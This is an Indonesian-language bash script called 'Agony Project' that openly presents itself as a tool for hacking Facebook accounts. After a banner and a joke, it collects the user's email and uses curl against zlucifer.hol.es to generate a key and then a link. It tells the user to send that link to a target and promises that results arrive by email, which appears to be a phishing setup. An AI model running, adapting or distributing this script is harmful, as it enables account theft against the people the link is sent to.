#!/bin/bash
echo Selamat datang kak, Siapa nick kaka? #tulisan keluar
read nick #membaca yang ditulis
echo "         ,.*====.   '.       .'   .====*., "
echo "        .-  /c)}}},    :...:    ,{{{(c\  -. "
echo "    _.-'-6>   {{{{{'''        '''}}}}}   <9-'-._ "
echo "   t         |}}}}}}           {{{{{{|         y "
echo "    \__.___.'{{{{{{{           }}}}}}}'.___.__/ "
echo "         [__/}}}}}}}}         {{{{{{{{\__]  "
echo "         {{{.'      '-._   _.-'      '.}}} "
echo "         }}/                           \{{ "
echo "         {{|       AGONY Project       |}} "
echo "         }}|       =============       |{{ "
echo "  .------{{{\    ,               ,    /}}}------. "
echo " //.--------'    ;               ;   '---------.\\ "
echo "((///  _          \             /          _  \\\)) "
echo " (((--'  ''-------' ' '-----' ' '-------''  '--))) "
echo " ===================================================="
echo "  Agony Project adalah tools untuk meretas Facebook"
echo "  Result otomatis masuk ke email kamu"
echo " ===================================================="


echo Selamat datang $nick ":)" Jones! :v
echo
echo "Kenapa zombie nyerangnya keroyokan? :p"
echo "jawab?"
read jawab
echo "KALO SENDIRI ITU KAKA! :v"
echo "NGAKAK DASAR JONES !!! :p"
echo
echo "Mulai Agony Project?"
echo "y/n"
read confirm
if [ $confirm = "y" ]; then
echo "Mengecek Tools"
i=0
max=100
while [ $i -le $max ]; do
echo -ne "\nChecking percentage : $i% "
sleep 0.03
if [ $i -eq 100 ]; then
echo -ne " [complete!]\n"
echo "==========================================================="
echo "Silahkan masukan email kaka untuk menerima result"
read email
curl -s http://zlucifer.hol.es/Project_Agony/base64.php?key=$email
#create key base64
echo
echo "Copy Key diatas dan paste disini"
read create
curl -s http://zlucifer.hol.es/Project_Agony/create.php?key=$create
#confrim key base64
echo
echo "Copy Link diatas dan kirim ke target"
echo "Result otomatis masuk ke email kamu"
fi
let i++
done
else
echo "Kesalahan"
fi
